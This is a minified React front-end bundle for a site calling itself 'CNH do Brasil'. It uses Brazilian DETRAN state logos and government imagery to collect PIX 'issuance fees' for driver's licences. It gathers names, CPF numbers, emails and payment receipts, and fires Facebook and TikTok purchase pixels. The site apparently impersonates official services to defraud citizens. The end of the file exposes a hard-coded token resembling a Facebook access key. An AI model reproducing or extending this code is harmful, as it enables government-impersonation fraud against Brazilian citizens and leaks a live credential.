...
function c3() {
  return l.jsx("div", {
    ...
    children: l.jsxs("button", {
      ...
      children: [l.jsx("img", {
        src: "/images/gov-internet-banking.png",
...
function gp() {
  ...
  x.useEffect(() => {
    if (w.current) return;
    w.current = !0;
    const p = "fb_initiatecheckout_success_tracked";
    ...
    if (typeof window.ttq < "u") try {
      window.ttq.track("InitiateCheckout", j), console.log("TikTok Pixel: InitiateCheckout tracked")
    } catch (A) {
      ...
      try {
        ...
        if (C.success && C.status) {
          if (h(C.status), C.status === "paid") {
            console.log("PAGAMENTO DA TAXA DE EMISSÁO CONFIRMADO!");
            const dedupKey = `fb_conversion_${t.transaction_id}`;
            if (t != null && t.transaction_id && !localStorage.getItem(dedupKey)) {
              const purchaseValue = (t == null ? void 0 : t.amount) || 74.90;
              if (typeof window.fbq < "u") window.fbq("track", "Purchase", {
                value: purchaseValue,
                currency: "BRL",
                content_name: "Taxa Emissao CNH - CNH do Brasil",
                content_type: "product",
                content_ids: [t.transaction_id],
      ...
      children: l.jsxs(bn, {
        ...
        children: [l.jsxs(ci, {
          ...
          children: [l.jsx("div", {
            ...
            children: l.jsx("img", {
              src: "/images/carteira-digital.webp",
...
const Tg = ({
  ...
  Jr = [{
    ...
    image: "/images/detran-mtrans.png"
  }];
...
function DE() {
  ...
  const b = async () => {
    ...
    try {
      ...
      if (I.success) {
        n(I);
        if (!localStorage.getItem("fb_initiatecheckout_pixpayment_tracked") && typeof window.fbq < "u") {
          window.fbq("track", "InitiateCheckout", {
            value: 63.20,
            currency: "BRL",
            content_name: "Pagamento via PIX - CNH do Brasil",
            content_type: "product"
          }), localStorage.setItem("fb_initiatecheckout_pixpayment_tracked", new Date().toISOString())
        }
        if (I.pix_code) try {
...
const Rg = {
  AC: "/images/detran-acre.png",
  AL: "/images/detran-alagoas.png",
  AP: "/images/detran-amapa.png",
  AM: "/images/detran-amazonas.png",
  BA: "/images/detran-ba.png",
  CE: "/images/detran-ce.svg",
  DF: "/images/detran-df.webp",
  ...
  MA: "/images/detran-ma.png",
  MT: "/images/detran-mt-gov.png",
  MS: "/images/detran-ms.png?itok=oDYhYuLp",
  MG: "/images/detran-mg.jpg/@@images/480d676e-e0af-433a-bec8-d9676a937a59.jpeg",
  PA: "/images/detran-pa.jpg",
  PB: "/images/detran-pb.png",
  PR: "/images/detran-pr.png",
  PE: "/images/detran-pe.jpg",
  PI: "/images/detran-pi.jpg",
  RJ: "/images/detran-rj.jpg",
  RN: "/images/detran-rn.png/image_preview",
...
function OE() {
  ...
  const [, e] = In(), [t, n] = x.useState([]), [r, s] = x.useState(!1), [o, i] = x.useState("initial"), [a, c] = x.useState(""), [u, d] = x.useState(""), [f, h] = x.useState(null), [y, w] = x.useState(null), v = x.useRef(null), S = x.useRef(!1), [g, p] = x.useState(""), [m, b] = x.useState(null), [C, j] = x.useState(!1), [A, P] = x.useState(!1), [M, _] = x.useState(""), [G, I] = x.useState("pending"), [$, U] = x.useState(600), [te, re] = x.useState(null), [X, D] = x.useState(!1), [R, L] = x.useState([]), [J, oe] = x.useState(!1), [ze, Ue] = x.useState(!1), [wr, Je] = x.useState(""), [dn, to] = x.useState(""), [no, ro] = x.useState(!1), [so, ki] = x.useState(!1), [br, Ri] = x.useState(null), [pixComprovanteErro, setPixComprovanteErro] = x.useState(!1), Yl = x.useRef(null), [xh, wh] = x.useState([]), [N, E] = x.useState(!1), [T, z] = x.useState([]), V = x.useRef(null), [F, Q] = x.useState(""), Z = f != null && f.nome ? _i(f.nome.split(" ")[0]) : "Cidadão", Te = () => ["JULHO", "AGOSTO", "SETEMBRO", "OUTUBRO", "NOVEMBRO", "DEZEMBRO"].map(W => ({
    ...
    try {
      ...
      if (Y.success && Y.status) {
        if (I(Y.status), Y.status === "paid") {
          const dedupKey = `fb_conversion_${B}`;
          if (console.log("PAGAMENTO CONFIRMADO!", Y.bank_tx_id), !localStorage.getItem(dedupKey) && typeof window < "u" && window.fbq) {
            const ge = window.fbq;
            ge("track", "Purchase", {
    ...
    if (m != null && m.deposit_id) {
      ...
      try {
        ...
        if (W.success && W.status === "paid") {
          const dedupKey = `fb_conversion_${m.deposit_id}`;
          if (console.log("PAGAMENTO CONFIRMADO (manual)!", W.bank_tx_id), !localStorage.getItem(dedupKey) && typeof window < "u" && window.fbq) {
            const Y = window.fbq;
            Y("track", "Purchase", {
              value: (m == null ? void 0 : m.amount) || 63.20,
              currency: "BRL",
    ...
    if (!br) return;
    ro(!0);
    setPixComprovanteErro(!1);
    try {
      if (!(m != null && m.deposit_id)) { ro(!1); setPixComprovanteErro(!0); return; }
      const W = await (await fetch(`/api/check-payment?id=${m.deposit_id}`)).json();
      if (W.success && W.status === "paid") {
        const dedupKey = `fb_conversion_${m.deposit_id}`;
        if (!localStorage.getItem(dedupKey) && typeof window < "u" && window.fbq) {
      ...
      const arquivoBase64 = await new Promise((res, rej) => {
        const fr = new FileReader();
        fr.onload = () => res(fr.result);
        fr.onerror = rej;
        fr.readAsDataURL(br);
      });
      const up = await (await fetch("/api/comprovantes-upload", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          transaction_id: m.deposit_id,
          customer_name: (f == null ? void 0 : f.nome) || "",
          customer_cpf: (f == null ? void 0 : f.cpf) || "",
          customer_email: (f == null ? void 0 : f.email) || "",
          arquivo: arquivoBase64,
          filename: br.name || "comprovante.png"
        })
      })).json();
      if (up.success) {
        const dedupKey = `fb_conversion_${m.deposit_id}`;
      ...
      ro(!1);
      setPixComprovanteErro(!0);
    } catch (e) {
      console.error("Erro ao verificar pagamento (comprovante):", e);
      ro(!1);
      setPixComprovanteErro(!0);
    }
  };
  x.useEffect(() => {
    const storedDepositId = localStorage.getItem("currentDepositId");
    if (!storedDepositId) return;
    (async () => {
      try {
        const r = await (await fetch(`/api/check-payment?id=${storedDepositId}`)).json();
        if (r.success && r.status === "paid") {
          window.location.href = "/laudo";
        }
      } catch (e) {
        console.error("Erro ao retomar verificacao de pagamento:", e);
      }
    })();
  }, []);
  x.useEffect(() => {
          ...
          children: [t.map((B, W) => l.jsx("div", {
            ...
            children: [no && l.jsx("div", {
              ...
              children: [l.jsx("div", {
                ...
                }), pixComprovanteErro && l.jsx("div", {
                  className: "mt-3 p-3 bg-red-50 border border-red-300 rounded-md text-red-700 text-sm font-medium",
                  children: "Comprovante não reconhecido: não identificamos o pagamento deste pedido em nosso sistema. Realize o pagamento para prosseguir."
                })]
              })]
            })]
          })]
  ...
  const g = x.useCallback(async C => {
    try {
      ...
      if (A.success && A.status && (w(A.status), A.status === "paid")) {
        const dedupKey = `fb_conversion_${C}`;
        if (!localStorage.getItem(dedupKey) && typeof window < "u" && window.fbq) {
          const P = window.fbq;
          P("track", "Purchase", {
...
/* Checkout Token */
window.CHECKOUT_TOKEN = 'EAAeyFC3IZAHcBR6m5qMlZCFHLjeVdypBE9NSZCDaIKRJ4JubZB3Pz0cno1sqNoYYHrduxFJdZCDZB352EwZBH0TEXCZBjZC2L2TjW0XiAKDOKytJPrl7Kv9qVY3OCJLwvZBSo8l5ZBYfw5WkLN4Sbvh245IZB9ZAdF1LOgVvSIcZCa5eD9XgmD7gDpfjuIZCg4HW9nERwZDZD';
